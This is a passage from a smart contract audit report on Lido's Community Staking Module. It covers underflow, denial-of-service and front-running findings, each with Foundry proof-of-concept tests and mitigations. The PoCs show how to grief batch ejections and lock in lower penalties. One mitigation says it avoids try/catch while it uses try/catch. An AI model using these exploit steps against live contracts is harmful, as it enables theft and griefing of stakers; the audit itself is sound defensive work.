import {NodeOperatorManagementProperties} from "../src/interfaces/ICSModule.sol";
import {ICSAccounting} from "../src/interfaces/ICSAccounting.sol";
import {ICSParametersRegistry} from "../src/interfaces/ICSParametersRegistry.sol";
import {ICSExitPenalties} from "../src/interfaces/ICSExitPenalties.sol";
import {ILidoLocator} from "../src/interfaces/ILidoLocator.sol";

// -------- Mocks (minimal) --------
contract MockLocator is ILidoLocator {
    function lido() external pure returns (address){return address(0);}  
    function stakingRouter() external pure returns (address){return address(0);}
    function oracle() external pure returns (address){return address(0);}  
    function withdrawalQueue() external pure returns (address){return address(0);}  
    function depositSecurityModule() external pure returns (address){return address(0);}  
    function treasury() external pure returns (address){return address(0);}  
    function insuranceFund() external pure returns (address){return address(0);}  
    function validatorsExitBusOracle() external pure returns (address){return address(0);}  
    function burner() external pure returns (address){return address(0);}  
}

contract MockParams is ICSParametersRegistry {
    function QUEUE_LOWEST_PRIORITY() external pure returns (uint256){return 1;}  
    function QUEUE_LEGACY_PRIORITY() external pure returns (uint256){return type(uint256).max;}  
    function getKeysLimit(uint256) external pure returns (uint256){return 10_000;}  
    function getQueueConfig(uint256) external pure returns (uint32,uint32){return (1,100);}  
    function getElRewardsStealingAdditionalFine(uint256) external pure returns (uint256){return 0;}  
    function getKeyRemovalCharge(uint256) external pure returns (uint256){return 0;}  
    function getAllowedExitDelay(uint256) external pure returns (uint256){return 0;}
}

contract MockAccounting is ICSAccounting {
    uint256 internal _unbondedToEject;

    // setter used by the test
    function setUnbonded(uint256 v) external { _unbondedToEject = v; }

    function getUnbondedKeysCountToEject(uint256) external view returns(uint256){return _unbondedToEject;}  
    // --- unused functions ---
    function getBondCurveId(uint256) external pure returns(uint256){return 0;}  
    function depositETH(address,uint256) external payable{}  
    function getRequiredBondForNextKeys(uint256,uint256) external pure returns(uint256){return 0;}  
    function depositStETH(address,uint256,uint256,PermitInput calldata) external {}  
    function getRequiredBondForNextKeysWstETH(uint256,uint256) external pure returns(uint256){return 0;}  
    function depositWstETH(address,uint256,uint256,PermitInput calldata) external {}  
    function lockBondETH(uint256,uint256) external {}  
    function compensateLockedBondETH(uint256) external payable{}  
    function releaseLockedBondETH(uint256,uint256) external {}  
    function settleLockedBondETH(uint256) external returns(bool){return false;}  
    function penalize(uint256,uint256) external {}  
    function chargeFee(uint256,uint256) external {}  
    function getUnbondedKeysCount(uint256) external pure returns(uint256){return 0;}  
    function feeDistributor() external pure returns(address){return address(0);}  
}

contract MockExitPen is ICSExitPenalties {
    function getExitPenaltyInfo(uint256,bytes calldata) external pure returns (ExitPenaltyInfo memory) { revert(); }
    function processStrikesReport(uint256, bytes calldata) external {}
    function processTriggeredExit(uint256, bytes calldata, uint256, uint256) external {}
    function isValidatorExitDelayPenaltyApplicable(uint256, bytes calldata, uint256) external pure returns (bool){return false;}  
    function processExitDelayReport(uint256, bytes calldata,uint256) external {}
}

contract UnderflowSummaryTest is Test {
    CSModule csm;
    MockAccounting acc;
    address admin = address(0xAA);
    address gate  = address(0xBB);
    address manager = address(0xCC);

    function setUp() public {
        acc = new MockAccounting();
        csm = new CSModule("CSM", address(new MockLocator()), address(new MockParams()), address(acc), address(new MockExitPen()));
        csm.initialize(admin);
        vm.prank(admin);
        csm.grantRole(csm.CREATE_NODE_OPERATOR_ROLE(), gate);
        vm.prank(admin);
        csm.grantRole(csm.RESUME_ROLE(), admin);
        vm.prank(admin);
        csm.resume();
    }

    function testUnderflow() public {
        // 1. create NO
        vm.prank(gate);
        uint256 id = csm.createNodeOperator(
            manager,
            NodeOperatorManagementProperties(manager, manager, false),
            address(0)
        );

        // 2. add 10 keys (bond mocked as zero for simplicity)
        bytes memory pk = new bytes(48*10);
        bytes memory sig = new bytes(96*10);
        vm.prank(manager);
        csm.addValidatorKeysETH{value: 0}(manager, id, 10, pk, sig);

        // 3. fake accounting saying 12 validators are unbonded
        acc.setUnbonded(12);

        // 4. read summary => underflow
        (uint256 mode, uint256 tgt,,,,,,) = csm.getNodeOperatorSummary(id);

        assertEq(mode, 2, "mode should be FORCED");
        assertEq(tgt, type(uint256).max - 1, "underflow produced MaxUint-1");
    }
}


## Suggested Mitigation
Perform subtractions in checked arithmetic and cap the result at zero instead of using `unchecked`. Example:
```
uint256 nonWithdrawn = no.totalAddedKeys - no.totalWithdrawnKeys;
if (nonWithdrawn > totalUnbondedKeys) {
    targetValidatorsCount = nonWithdrawn - totalUnbondedKeys;
} else {
    targetValidatorsCount = 0;
}
```

## [H-8]. DOS issue in CSVerifier::_getHistoricalBlockRootGI

## Description
The `_getHistoricalBlockRootGI` function constructs a generalized index (G-Index) for verifying historical block roots. This G-Index is used to prove that a historical block's header (`oldBlock`) is part of a recent, trusted block's state (`beaconBlock`). The function incorrectly constructs this G-Index for proofs that span across a network fork, identified by `PIVOT_SLOT`.

The G-Index path is built in two main parts: the path to the `historical_summaries` array in the `BeaconState`, and the subsequent path to the specific `block_root` within a `HistoricalSummary` object. The first part is correctly determined by `recentSlot`. However, the second part is determined by `targetSlot`.

This is incorrect because the entire proof is verified against the state root of `recentSlot`. Therefore, the entire G-Index path must conform to the state structure defined by the fork active at `recentSlot`. Using `targetSlot` to determine a portion of the path results in a logically inconsistent G-Index when `recentSlot` and `targetSlot` are on different sides of the `PIVOT_SLOT` and the G-Indices for the sub-path have changed. This will cause all such cross-fork historical proofs to fail verification.

## Impact
All validator withdrawals whose block roots lie before PIVOT_SLOT but whose proofs must be verified against a post-fork state can never be processed. Until the contract is upgraded, those withdrawals remain permanently unclaimable, effectively freezing the corresponding validator balances and any associated rewards. This also exposes node operators to unavoidable bond penalties because they cannot deliver the required proofs.

## Proof of Concept
1. Deploy the `CSVerifier` contract with a `PIVOT_SLOT` and distinct G-Indices for `GI_FIRST_BLOCK_ROOT_IN_SUMMARY_PREV` and `GI_FIRST_BLOCK_ROOT_IN_SUMMARY_CURR`.
2. Attempt to process a historical withdrawal proof where `recentSlot` (from `beaconBlock`) is after `PIVOT_SLOT` and `targetSlot` (from `oldBlock`) is before `PIVOT_SLOT`.
3. The `_getHistoricalBlockRootGI` function will be called internally. It will use `GI_FIRST_HISTORICAL_SUMMARY_CURR` (correctly based on `recentSlot`) but then concatenate it with `GI_FIRST_BLOCK_ROOT_IN_SUMMARY_PREV` (incorrectly based on `targetSlot`).
4. The resulting G-Index will be invalid for the state structure at `recentSlot`.
5. The call to `SSZ.verifyProof` will fail, causing the entire `processHistoricalWithdrawalProof` transaction to revert, effectively denying the service for valid cross-fork proofs.

## Proof of Code
```solidity
// test/CSVerifier.t.sol
// SPDX-FileCopyrightText: 2025 Lido <info@lido.fi>
// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.24;

import { Test, console } from "forge-std/Test.sol";
import { CSVerifier } from "../src/CSVerifier.sol";
import { ICSVerifier } from "../src/interfaces/ICSVerifier.sol";
import { ICSModule, ValidatorWithdrawalInfo } from "../src/interfaces/ICSModule.sol";
import { Slot, GIndex } from "../src/lib/Types.sol";

// Mock contract for ICSModule
contract MockCSModule is ICSModule {
    function getSigningKeys(uint256, uint256, uint256) external pure returns (bytes memory) {
        return new bytes(48);
    }
    function submitWithdrawals(ValidatorWithdrawalInfo[] calldata) external {}
    // Unimplemented functions
    function addValidatorKeys(bytes[] calldata, bytes[] calldata, address) external payable {}
    function removeValidatorKeys(uint256, uint256, uint256) external {}
    function getNodeOperatorsCount() external view returns (uint256) { return 0; }
    function getNodeOperator(uint256) external view returns (NodeOperator memory) { return emptyNodeOperator(); }
    function getNodeOperatorSummary(uint256) external view returns (NodeOperatorSummary memory) { NodeOperatorSummary memory summary; return summary; }
    function getStakingModuleSummary() external view returns (uint256, uint256, uint256) { return (0,0,0); }
    function isValidatorWithdrawn(bytes calldata) external view returns (bool) { return false; }
    function obtainDepositData(uint256) external returns (bytes[] memory, bytes[] memory) { return (new bytes[](0), new bytes[](0)); }

    function emptyNodeOperator() internal pure returns (NodeOperator memory) {
        NOAddresses memory addrs = NOAddresses(address(0), address(0), address(0), address(0));
        return NodeOperator(addrs, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
    }
}

// Test contract to expose internal function
contract TestCSVerifier is CSVerifier {
    constructor(
        address withdrawalAddress,
        address module,
        uint64 slotsPerEpoch,
        uint64 slotsPerHistoricalRoot,
        ICSVerifier.GIndices memory gindices,
        Slot firstSupportedSlot,
        Slot pivotSlot,
        Slot capellaSlot,
        address admin
    ) CSVerifier(withdrawalAddress, module, slotsPerEpoch, slotsPerHistoricalRoot, gindices, firstSupportedSlot, pivotSlot, capellaSlot, admin) {}

    function getHistoricalBlockRootGIPublic(
        Slot recentSlot,
        Slot targetSlot
    ) external view returns (GIndex) {
        return _getHistoricalBlockRootGI(recentSlot, targetSlot);
    }
}

contract CSVerifierVulnTest is Test {
    TestCSVerifier verifier;
    MockCSModule mockModule;
    address constant ADMIN = address(0x1);
    address constant WITHDRAWAL_ADDRESS = address(0x2);

    GIndex constant GI_SUMMARY_PREV = GIndex.wrap(23);
    GIndex constant GI_SUMMARY_CURR = GIndex.wrap(24);
    GIndex constant GI_BLOCK_ROOT_PREV = GIndex.wrap(100);
    GIndex constant GI_BLOCK_ROOT_CURR = GIndex.wrap(200);

    Slot constant CAPELLA_SLOT = Slot.wrap(100);
    Slot constant PIVOT_SLOT = Slot.wrap(200);
    Slot constant FIRST_SUPPORTED_SLOT = Slot.wrap(100);

    uint64 constant SLOTS_PER_HISTORICAL_ROOT = 8192;

    function setUp() public {
        mockModule = new MockCSModule();
        ICSVerifier.GIndices memory gindices = ICSVerifier.GIndices({
            gIFirstWithdrawalPrev: GIndex.wrap(0),
            gIFirstWithdrawalCurr: GIndex.wrap(0),
            gIFirstValidatorPrev: GIndex.wrap(0),
            gIFirstValidatorCurr: GIndex.wrap(0),
            gIFirstHistoricalSummaryPrev: GI_SUMMARY_PREV,
            gIFirstHistoricalSummaryCurr: GI_SUMMARY_CURR,
            gIFirstBlockRootInSummaryPrev: GI_BLOCK_ROOT_PREV,
            gIFirstBlockRootInSummaryCurr: GI_BLOCK_ROOT_CURR
        });

        verifier = new TestCSVerifier(
            WITHDRAWAL_ADDRESS,
            address(mockModule),
            32,
            SLOTS_PER_HISTORICAL_ROOT,
            gindices,
            FIRST_SUPPORTED_SLOT,
            PIVOT_SLOT,
            CAPELLA_SLOT,
            ADMIN
        );
    }

    function test_PoC_IncorrectGIndexForCrossForkProof() public {
        Slot recentSlot = Slot.wrap(PIVOT_SLOT.unwrap() + 50); // post-fork
        Slot targetSlot = Slot.wrap(PIVOT_SLOT.unwrap() - 50); // pre-fork

        GIndex actualGI = verifier.getHistoricalBlockRootGIPublic(recentSlot, targetSlot);

        uint256 targetSlotShifted = targetSlot.unwrap() - CAPELLA_SLOT.unwrap();
        uint256 summaryIndex = targetSlotShifted / SLOTS_PER_HISTORICAL_ROOT;
        uint256 rootIndex = targetSlot.unwrap() % SLOTS_PER_HISTORICAL_ROOT;

        GIndex expectedCorrectGI = GI_SUMMARY_CURR;
        expectedCorrectGI = expectedCorrectGI.shr(summaryIndex);
        expectedCorrectGI = expectedCorrectGI.concat(GI_BLOCK_ROOT_CURR);
        expectedCorrectGI = expectedCorrectGI.shr(rootIndex);
        
        GIndex expectedBuggyGI = GI_SUMMARY_CURR;
        expectedBuggyGI = expectedBuggyGI.shr(summaryIndex);
        expectedBuggyGI = expectedBuggyGI.concat(GI_BLOCK_ROOT_PREV); 
        expectedBuggyGI = expectedBuggyGI.shr(rootIndex);

        assertEq(GIndex.unwrap(actualGI), GIndex.unwrap(expectedBuggyGI), "Function produces the buggy G-Index");
        assertNotEq(GIndex.unwrap(actualGI), GIndex.unwrap(expectedCorrectGI), "Buggy G-Index must differ from correct one");
    }
}
```

## Suggested Mitigation
The G-Index for the block root within the `HistoricalSummary` object should be determined by `recentSlot`, not `targetSlot`, to ensure the entire path is consistent with the state against which the proof is being verified. Change `targetSlot` to `recentSlot` in the relevant line.

```solidity
// src/CSVerifier.sol:565-570
    function _getHistoricalBlockRootGI(
        Slot recentSlot,
        Slot targetSlot
    ) internal view returns (GIndex gI) {
// [...]
        gI = gI.concat(
            recentSlot < PIVOT_SLOT // <<< FIX: Use recentSlot
                ? GI_FIRST_BLOCK_ROOT_IN_SUMMARY_PREV
                : GI_FIRST_BLOCK_ROOT_IN_SUMMARY_CURR
        ); // historicalSummaries[summaryIndex].blockRoots[0]
// [...]
    }
```



# Medium Risk Findings

## [M-1]. DOS issue in CSStrikes::processBadPerformanceProof

## Description
The `processBadPerformanceProof` function processes a batch of validator ejections based on Merkle proofs of bad performance. However, the function is designed to be atomic, meaning the entire batch transaction reverts if any single ejection fails. This design is vulnerable to both Denial-of-Service (DoS) griefing and front-running attacks.

An ejection can fail for two main reasons:
1. The proof is valid, but the validator does not have enough strikes to meet the ejection threshold (`strikes < threshold`).
2. The validator has already been ejected, causing the `ejector.ejectBadPerformer` call to revert.

The vulnerable code is the loop in `processBadPerformanceProof`:

```solidity
// src/CSStrikes.sol:L202-L211
        uint256 valuePerKey = msg.value / keyStrikesList.length;
        for (uint256 i; i < keyStrikesList.length; ++i) {
            _ejectByStrikes(
                keyStrikesList[i],
                pubkeys[i],
                valuePerKey,
                refundRecipient
            );
        }
```

The `_ejectByStrikes` internal function contains checks and external calls that can revert:

```solidity
// src/CSStrikes.sol:L293-L295
        if (strikes < threshold) {
            revert NotEnoughStrikesToEject();
        }
```

This creates two attack vectors:
- **DoS/Griefing**: An attacker can force a legitimate user's transaction to fail by ensuring one of the keys in their batch is ineligible. For example, if a user tries to process a batch of 10 ejections, and an attacker knows one of them will fail, they can simply wait for the user to submit the transaction, which will then revert, causing the user to lose gas.
- **Front-running/MEV**: A malicious actor can monitor the mempool for `processBadPerformanceProof` transactions. When a large batch transaction is submitted, the attacker can copy one of the validator proofs, submit their own transaction with a higher gas price to eject just that single validator, and cause the original batch transaction to fail. The attacker can do this to claim the ejection reward (`valuePerKey`) or simply to grief the original sender.

## Impact
This vulnerability can prevent or delay the ejection of underperforming validators, undermining a key security mechanism of the protocol. Legitimate reporters who submit batch transactions are at risk of losing gas fees due to reverts caused by front-running or misconfiguration. This can discourage participation in reporting bad performance, weakening the overall health of the validator set.

## Proof of Concept
A front-running attack can be executed as follows:

1.  A trusted Oracle reports a Merkle tree containing proofs for two validators, Validator A and Validator B, both of whom have enough strikes to be ejected.
2.  A legitimate user, Alice, prepares and submits a transaction to call `processBadPerformanceProof` for both Validator A and Validator B, providing the necessary proofs and `msg.value` as a reward for the ejector.
3.  An attacker, Bob, sees Alice's transaction in the mempool.
4.  Bob copies the proof for Validator A and submits his own transaction to `processBadPerformanceProof` for only Validator A, but with a higher gas price to ensure it gets mined first.
5.  Bob's transaction succeeds. Validator A is ejected, and Bob receives the reward for it.
6.  Alice's transaction is then processed. The loop begins. When it tries to process Validator A, the call to `ejector.ejectBadPerformer` reverts because Validator A is already being ejected.
7.  The revert inside the loop causes Alice's entire transaction to fail. She loses her gas fee, and more importantly, Validator B is not ejected.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import { Test } from "forge-std/Test.sol";
import { Vm } from "forge-std/Vm.sol";
import { CSStrikes } from "../../src/CSStrikes.sol";
import { ICSModule, NodeOperator, NodeOperatorSummary } from "../../src/interfaces/ICSModule.sol";
import { ICSAccounting } from "../../src/interfaces/ICSAccounting.sol";
import { ICSParametersRegistry } from "../../src/interfaces/ICSParametersRegistry.sol";
import { ICSEjector } from "../../src/interfaces/ICSEjector.sol";
import { MerkleTree } from "../helpers/MerkleTree.sol";

// Mocks
contract MockAccounting is ICSAccounting {
    function getBondCurveId(uint256) external view returns (uint256) { return 0; }
    function getBondSummary(uint256) external view returns (uint256, uint256, uint256, uint256) { return (0,0,0,0); }
    function getBond(uint256) external view returns (uint256) { return 0; }
}

contract MockModule is ICSModule {
    ICSAccounting public mockAccounting;
    constructor() { mockAccounting = new MockAccounting(); }
    function getSigningKeys(uint256, uint256, uint256) external view returns (bytes memory) { return hex"01"; }
    function accounting() external view returns (ICSAccounting) { return mockAccounting; }
    function getNodeOperatorsCount() external view returns (uint256) { return 0; }
    function getNodeOperator(uint256) external view returns (NodeOperator memory) { revert(); }
    function getNodeOperatorSummary(uint256) external view returns (NodeOperatorSummary memory) { revert(); }
    function getStakingModuleSummary() external view returns (uint256, uint256, uint256) { return (0, 0, 0); }
    function addValidatorKeys(bytes[] calldata, bytes[] calldata) external {} 
    function onRewardsMinted(uint256) external {} 
    function isValidatorWithdrawn(bytes calldata) external view returns (bool) { return false; }
}

contract MockEjector is ICSEjector {
    mapping(uint256 => mapping(uint256 => bool)) public isEjected;
    uint256 public ejectedCount = 0;

    function ejectBadPerformer(uint256 noId, uint256 keyIndex, address) external payable {
        if (isEjected[noId][keyIndex]) {
            revert("Already ejected");
        }
        isEjected[noId][keyIndex] = true;
        ejectedCount++;
    }
}

contract MockParamRegistry is ICSParametersRegistry {
    function getStrikesParams(uint256) external view returns (uint256 penalty, uint256 threshold) {
        return (0, 10); // threshold = 10
    }
    function getBondCurve(uint256) external view returns (uint256, uint256, uint256, uint256) { return (0,0,0,0); }
    function getKeyRemovalCharge(uint256) external view returns (uint256) { return 0; }
}

contract FrontrunTest is Test {
    CSStrikes strikesContract;
    MockModule mockModule;
    MockEjector mockEjector;
    MockParamRegistry mockParamRegistry;
    address oracle = makeAddr("oracle");
    address admin = makeAddr("admin");
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");

    function setUp() public {
        mockModule = new MockModule();
        mockEjector = new MockEjector();
        mockParamRegistry = new MockParamRegistry();

        vm.startPrank(admin);
        strikesContract = new CSStrikes(
            address(mockModule),
            oracle,
            address(0), // Mock exit penalties
            address(mockParamRegistry)
        );
        strikesContract.initialize(admin, address(mockEjector));
        vm.stopPrank();
    }

    function test_FrontrunGriefing() public {
        // 1. Oracle reports a Merkle tree with two valid leaves
        ICSStrikes.KeyStrikes memory keyA = ICSStrikes.KeyStrikes({ nodeOperatorId: 1, keyIndex: 1, data: new uint256[](1) });
        keyA.data[0] = 15; // strikes > threshold
        bytes memory pubkeyA = hex"01";
        bytes32 leafA = strikesContract.hashLeaf(keyA, pubkeyA);

        ICSStrikes.KeyStrikes memory keyB = ICSStrikes.KeyStrikes({ nodeOperatorId: 2, keyIndex: 2, data: new uint256[](1) });
        keyB.data[0] = 20; // strikes > threshold
        bytes memory pubkeyB = hex"02";
        bytes32 leafB = strikesContract.hashLeaf(keyB, pubkeyB);

        bytes32[] memory leaves = new bytes32[](2);
        leaves[0] = leafA;
        leaves[1] = leafB;
        MerkleTree.Data memory tree = MerkleTree.newTree(leaves);

        vm.prank(oracle);
        strikesContract.processOracleReport(tree.root, "cid");

        // 2. Alice prepares a batch transaction for both keys
        ICSStrikes.KeyStrikes[] memory batch = new ICSStrikes.KeyStrikes[](2);
        batch[0] = keyA;
        batch[1] = keyB;
        MerkleTree.Proof memory multiProof = MerkleTree.getMultiProof(tree, leaves);
        uint256 value = 2 ether;

        // 3. Bob front-runs Alice by ejecting keyA
        ICSStrikes.KeyStrikes[] memory bobBatch = new ICSStrikes.KeyStrikes[](1);
        bobBatch[0] = keyA;
        bytes32[] memory bobLeaves = new bytes32[](1); bobLeaves[0] = leafA;
        MerkleTree.Proof memory bobProof = MerkleTree.getMultiProof(tree, bobLeaves);
        
        vm.prank(bob);
        strikesContract.processBadPerformanceProof{value: 1 ether}(
            bobBatch,
            bobProof.proof,
            bobProof.proofFlags,
            bob
        );
        assertEq(mockEjector.ejectedCount(), 1, "Bob should eject one key");

        // 4. Alice's transaction is executed and reverts
        vm.prank(alice);
        vm.expectRevert("Already ejected");
        strikesContract.processBadPerformanceProof{value: value}(
            batch,
            multiProof.proof,
            multiProof.proofFlags,
            alice
        );

        // 5. Assert that Key B was not ejected due to the revert
        assertEq(mockEjector.ejectedCount(), 1, "Alice's transaction failed, only Bob's key was ejected");
        assertFalse(mockEjector.isEjected(keyB.nodeOperatorId, keyB.keyIndex), "Key B should not have been ejected");
    }
}
```

## Suggested Mitigation
1. Refactor `_ejectByStrikes` so that it NEVER reverts for the two expected failure modes. Return a boolean indicating success instead.

``solidity
function _ejectByStrikes( ... ) internal returns (bool ok) {
    uint256 strikes = _sumStrikes(keyStrikes.data);
    uint256 curveId  = ACCOUNTING.getBondCurveId(keyStrikes.nodeOperatorId);
    (, uint256 threshold) = PARAMETERS_REGISTRY.getStrikesParams(curveId);
    if (strikes < threshold) return false; // not enough strikes – skip

    // attempt external call that may revert if already ejected
    try ejector.ejectBadPerformer{value: value}(keyStrikes.nodeOperatorId, keyStrikes.keyIndex, refundRecipient) {
        EXIT_PENALTIES.processStrikesReport(keyStrikes.nodeOperatorId, pubkey);
        return true;
    } catch { // already ejected or any other reason
        return false;
    }
}
``

2. In `processBadPerformanceProof` loop, record how many succeed and refund unused ETH:

``solidity
uint256 successful;
for (uint256 i; i < keyStrikesList.length; ++i) {
    if (_ejectByStrikes(keyStrikesList[i], pubkeys[i], valuePerKey, refundRecipient)) {
        successful++;
    } else {
        emit EjectionSkipped(keyStrikesList[i].nodeOperatorId, keyStrikesList[i].keyIndex);
    }
}

uint256 refund = (keyStrikesList.length - successful) * valuePerKey;
if (refund > 0) {
    (bool sent,) = refundRecipient.call{value: refund}("");
    require(sent, "Refund failed");
}
require(successful > 0, "No valid ejections");
``

This approach:
• avoids `try/catch` on internal calls (solidity-invalid in original proposal)
• ensures the loop never reverts on individual failures
• guarantees callers recover unused ETH
• emits events for transparency
• keeps atomicity of each individual ejection while making the whole batch tolerant to failures.

## [M-2]. DOS issue in PermissionlessGate::addNodeOperatorETH

## Description
The `addNodeOperatorETH`, `addNodeOperatorStETH`, and `addNodeOperatorWstETH` functions in `PermissionlessGate` do not check if the `keysCount` parameter is greater than zero. This allows an attacker to create Node Operator entries with zero keys associated with them. The project's documentation explicitly states that Entry Gates should prevent the creation of empty Node Operators to avoid state bloat: "Entry Gates (Extensions) should ensure that at least one deposit data and the corresponding bond amount are required to create a Node Operator to avoid flooding the module with empty Node Operators.". By repeatedly calling these functions with `keysCount = 0`, an attacker can spam the `CSModule` contract with numerous empty Node Operator structs, leading to state bloat. This can degrade system performance and increase gas costs for any on-chain or off-chain components that need to read or iterate over the list of Node Operators.

## Impact
An attacker can create an arbitrary number of empty Node Operator entries in the `CSModule` at a low cost (the gas for two external calls per entry). This state bloat can increase gas costs for any process that iterates through Node Operators, potentially leading to performance degradation or a denial-of-service condition for certain functionalities. While it does not cause a direct loss of funds, it is a griefing vector that compromises the efficiency and robustness of the system.

## Proof of Concept
1. An attacker calls `PermissionlessGate.addNodeOperatorETH` with `keysCount` set to 0.
2. The `publicKeys` and `signatures` arguments are passed as empty `bytes`.
3. The `msg.value` is 0, as no bond is required for 0 keys.
4. The first external call, `MODULE.createNodeOperator`, succeeds in creating a new Node Operator entry in `CSModule`.
5. The second external call, `MODULE.addValidatorKeysETH`, is invoked with `keysCount = 0` and also succeeds.
6. As a result, a new, empty Node Operator struct is added to the `CSModule`'s state.
7. The attacker can repeat this process in a loop to create a large number of such empty entries, bloating the contract's state.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {PermissionlessGate} from "../src/PermissionlessGate.sol";
import {ICSAccounting} from "../src/interfaces/ICSAccounting.sol";
import {ICSModule, NodeOperatorManagementProperties} from "../src/interfaces/ICSModule.sol";

// -----------------------------------------------------------------------------
// Minimal mocks (they do NOT inherit the whole interfaces – only the selectors
// that PermissionlessGate actually calls are implemented, so the test compiles
// without having to stub dozens of irrelevant functions).
// -----------------------------------------------------------------------------

contract MockCSAccounting {
    function DEFAULT_BOND_CURVE_ID() external pure returns (uint256) {
        return 0;
    }
}

contract MockCSModule {
    uint256 public nodeOperatorCounter;
    mapping(uint256 => bool) public nodeOperatorExists;
    mapping(uint256 => uint256) public nodeOperatorKeys;

    ICSAccounting public immutable _accounting;

    constructor(address accounting_) {
        _accounting = ICSAccounting(accounting_);
    }

    // Selectors used by PermissionlessGate ------------------------------------------------
    function createNodeOperator(
        address /*from*/, 
        NodeOperatorManagementProperties calldata /*props*/, 
        address /*referrer*/
    ) external returns (uint256 id) {
        id = ++nodeOperatorCounter;
        nodeOperatorExists[id] = true;
    }

    function addValidatorKeysETH(
        address /*from*/,
        uint256 id,
        uint256 keysCount,
        bytes calldata,
        bytes calldata
    ) external payable {
        require(nodeOperatorExists[id], "NO DNE");
        nodeOperatorKeys[id] += keysCount;
    }

    function accounting() external view returns (ICSAccounting) {
        return _accounting;
    }

    // Helper that the test asserts against ------------------------------------------------
    function getNodeOperatorsCount() external view returns (uint256) {
        return nodeOperatorCounter;
    }
}

// -----------------------------------------------------------------------------
//                                TEST
// -----------------------------------------------------------------------------

contract PermissionlessGate_EmptyOperator_Test is Test {
    PermissionlessGate internal gate;
    MockCSModule       internal module;
    MockCSAccounting   internal accounting;

    address internal constant ADMIN    = address(0xA11CE);
    address internal constant ATTACKER = address(0xBEEF);

    function setUp() public {
        accounting = new MockCSAccounting();
        module     = new MockCSModule(address(accounting));
        gate       = new PermissionlessGate(address(module), ADMIN);
    }

    function test_createEmptyOperator() public {
        uint256 beforeCount = module.getNodeOperatorsCount();
        bytes memory empty;

        NodeOperatorManagementProperties memory props = NodeOperatorManagementProperties({
            managerAddress:      ATTACKER,
            rewardAddress:       ATTACKER,
            withdrawalAddress:   address(0),
            exitGatewayAddress:  address(0),
            active:              false,
            vetted:              false
        });

        vm.prank(ATTACKER);
        gate.addNodeOperatorETH(0, empty, empty, props, address(0));

        assertEq(module.getNodeOperatorsCount(), beforeCount + 1, "Empty NO created");
        assertEq(module.nodeOperatorKeys(beforeCount + 1), 0, "Keys count should stay zero");
    }
}


## Suggested Mitigation
Add a check to ensure `keysCount` is greater than zero at the beginning of the `addNodeOperatorETH`, `addNodeOperatorStETH`, and `addNodeOperatorWstETH` functions. This will enforce the documented requirement for Entry Gates and prevent the creation of empty Node Operators.

```solidity
// In PermissionlessGate.sol

error NoKeysProvided();

function addNodeOperatorETH(
    uint256 keysCount,
    bytes calldata publicKeys,
    bytes calldata signatures,
    NodeOperatorManagementProperties calldata managementProperties,
    address referrer
) external payable returns (uint256 nodeOperatorId) {
    if (keysCount == 0) {
        revert NoKeysProvided();
    }

    nodeOperatorId = MODULE.createNodeOperator({
        from: msg.sender,
        managementProperties: managementProperties,
        referrer: referrer
    });

    MODULE.addValidatorKeysETH{ value: msg.value }({
        from: msg.sender,
        nodeOperatorId: nodeOperatorId,
        keysCount: keysCount,
        publicKeys: publicKeys,
        signatures: signatures
    });
}

// A similar check should be added to addNodeOperatorStETH and addNodeOperatorWstETH.
```

## [M-3]. Frontrun/Backrun/Sandwhich MEV issue in CSExitPenalties::processStrikesReport

## Description
The `CSExitPenalties` contract allows for penalties to be recorded for underperforming validators. The `processStrikesReport` function is responsible for recording the `badPerformancePenalty`. It reads the penalty amount from `CSParametersRegistry` and, if the penalty has not been set yet, it stores the value and marks it as set. Once set, the penalty for that specific validator key cannot be changed due to the idempotency check: `if (exitPenaltyInfo.strikesPenalty.isValue) { return; }`.

The function that triggers this logic, `CSStrikes.processBadPerformanceProof`, is permissionless. This creates a front-running vulnerability. A malicious or economically rational Node Operator can monitor the blockchain for pending DAO transactions that aim to increase the `badPerformancePenalty` in `CSParametersRegistry`. By front-running this DAO transaction, the Node Operator can call `CSStrikes.processBadPerformanceProof` to trigger `processStrikesReport` while the penalty amount is still low (or zero). This will permanently lock in the lower penalty for their validator, allowing them to evade the higher, intended penalty.

## Impact
The protocol can lose funds in the form of uncollected penalties from underperforming Node Operators. This weakens the economic incentives for validators to perform well, potentially harming the overall health and security of the staking module. A Node Operator can exploit this to minimize their own penalties at the protocol's expense.

## Proof of Concept
1. The `badPerformancePenalty` for a given `curveId` is currently 0 ETH in `CSParametersRegistry`.
2. A validator belonging to a Node Operator with this `curveId` has performed poorly and has enough strikes to be penalized via `CSStrikes.processBadPerformanceProof`.
3. The Lido DAO submits a transaction to increase the `badPerformancePenalty` for that `curveId` to 1 ETH. This transaction is now in the mempool.
4. The Node Operator (or an attacker acting on their behalf) sees the DAO's transaction. They craft and send their own transaction calling `CSStrikes.processBadPerformanceProof`, setting a higher gas fee to ensure it gets mined first.
5. The Node Operator's transaction is executed. The call chain reaches `CSExitPenalties.processStrikesReport`.
6. The function reads the `badPerformancePenalty`, which is still 0 ETH. It records this value and sets the `isValue` flag to true for this validator's `strikesPenalty`.
7. The DAO's transaction is then mined, updating the penalty parameter to 1 ETH.
8. It is too late for the penalized validator. Their penalty is permanently recorded as 0, and any subsequent attempts to report strikes will be ignored due to the idempotency check.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {CSExitPenalties} from "src/CSExitPenalties.sol";
import {ICSExitPenalties, ExitPenaltyInfo} from "src/interfaces/ICSExitPenalties.sol";
import {ICSAccounting} from "src/interfaces/ICSAccounting.sol";
import {ICSParametersRegistry} from "src/interfaces/ICSParametersRegistry.sol";

/* -------------------------------------------------------------
 * very small mocks, only what we need for the PoC
 * -----------------------------------------------------------*/
contract ParametersRegistryMock is ICSParametersRegistry {
    mapping(uint256 => uint256) internal _badPenalty;

    function setBadPerformancePenalty(uint256 curveId, uint256 value) external {
        _badPenalty[curveId] = value;
    }

    function getBadPerformancePenalty(uint256 curveId) external view returns (uint256) {
        return _badPenalty[curveId];
    }

    /* unused */
    function getKeyRemovalCharge(uint256) external view returns (uint256) {}
    function getELRewardsStealingAdditionalFine(uint256) external view returns (uint256) {}
    function getKeysLimit(uint256) external view returns (uint256) {}
    function getPerformanceLeewayData(uint256) external view returns (uint256,uint256) {}
